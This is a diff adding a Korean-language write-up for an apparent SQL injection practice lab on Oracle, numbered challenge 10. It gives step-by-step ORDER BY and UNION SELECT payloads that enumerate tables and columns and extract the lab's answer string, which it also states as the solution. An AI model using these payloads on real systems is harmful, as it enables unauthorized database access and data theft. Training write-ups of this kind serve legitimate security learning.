@@ -1,0 +1,37 @@
+============================
+SQL Injection Oracle 10번
+1. 풀이과정
+	1)쿼리문 유추
+   	- '% ORDER BY 1, '% 입력 → 정상 출력
+   	- ORDER BY를 이용해 컬럼 개수 확인
+	2) 공격포인트
+   	- 검색 입력값에 SQL Injection 가능
+   	- UNION SELECT를 이용해 DB 정보 조회 가능
+	3) 제약사항
+  	 3-1) 컬럼 개수
+	- %' ORDER BY 6, '% 입력 → 에러
+	- 컬럼 수는 5개
+ 	  3-2) 자료형
+	- %' UNION SELECT '1','2','3','4','5' FROM dual WHERE '%'='
+	- 정상 출력 → 5개 컬럼 모두 문자열 사용 가능
+	4) 테이블명
+ 	  - %' UNION SELECT '1','2',table_name,'4','5' FROM user_tables WHERE '%'='
+ 	  - 확인된 테이블:
+ 	    MEMBER
+  	   SQL_UNION_ANSWER
+   	  ZIPCODE
+	5) 컬럼명
+ 	  - %' UNION SELECT '1','2',column_name,'4','5' FROM user_tab_columns WHERE table_name='SQL_UNION_ANSWER' AND '%'='
+  	 - 확인된 컬럼:
+   	  ANSWER_COLUMN
+   	  REG_ACCT
+   	  REG_DT
+    	 UDT_ACCT_ID
+    	 UDT_DT
+	6) 데이터 탈취
+   	- %' UNION SELECT '1','2',ANSWER_COLUMN,'4','5' FROM SQL_UNION_ANSWER WHERE '%'='
+  	 - 결과: this_is_perfect_answer
+
+
+2. 정답
+	this_is_perfect_answer
